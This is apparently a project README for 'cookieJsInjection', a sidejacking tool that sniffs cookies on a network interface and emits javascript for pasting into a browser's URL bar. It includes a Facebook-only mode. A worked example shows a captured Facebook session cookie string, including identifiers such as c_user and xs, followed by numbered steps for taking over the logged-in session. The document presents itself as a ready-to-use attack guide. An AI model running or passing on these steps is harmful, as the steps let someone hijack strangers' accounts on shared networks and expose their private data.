# A Simple sidejacking tool, using javascript cookie injection.

This software sniffs any interface for cookies, and generates javascript code that can be injected into any browser, by pasting it into the URL bar.

# Usage

To run the cookieJsInjection open a shell (e.g., bash) and execute the following command (cookieJsInjection requires scapy to run - http://www.secdev.org/projects/scapy/):

`./cookieJsInjection.py IFACE`

Where `IFACE` represents the network interface you wish to sniff on (e.g. eth0, wlan0, etc). 

If you supply the flag `-f`, it will only output facebook cookies, keeping track of the profiles captured in the session, and eliminating duplicate entries:

`./cookieJsInjection.py IFACE -f`

# Example of Facebook sidejacking


1 - Run cookieJsInjection and wait for cookies to appear

`glow:py-cookieJsInjection hiperion$ sudo python cookieJsInjection.py en1 -f`
`javascript:void(document.cookie="c_user=798929644");void(document.cookie="wd=1280x616");void(document.cookie="presence=DJ293759043BchADhA_2256.channel_22BsubA_5b1_2c1L798929644A5BF293757419186WMblcMsndPBbloMbvtMctMsbPBtA_5b_5dBfAnullBuctMsA0QBblADacA42V293758371Z416BlcA0AQ");void(document.cookie="cur_max_lag=20");void(document.cookie="act=1293757438495%2F1");void(document.cookie="L=20");void(document.cookie="datr=0fMcTTMFZZVhFiOJZvvO1pyO");void(document.cookie="locale=en_US");void(document.cookie="lu=TA3UCsI0Y6ezY6wydClUpeDw");void(document.cookie="sct=1293787415");void(document.cookie="W=1293757115");void(document.cookie="sid=3");void(document.cookie="xs=1e4d54055dbe34976a93d3a1fe574a19");void(document.cookie="x-referer=http%3A%2F%2Fwww.facebook.com%2F%23%2F");void(document.cookie="made_write_conn=1293751415");`

2 - Copy the javascript code (begining with `javascript:`).

3 - Open the browser in facebook.com (make sure you are logged out of any accounts).

4 - Paste the javascript code into the URL bar (press enter)

5 - Go to facebook.com
                                       
#Background

More information on sidejacking - http://en.wikipedia.org/wiki/Session_hijacking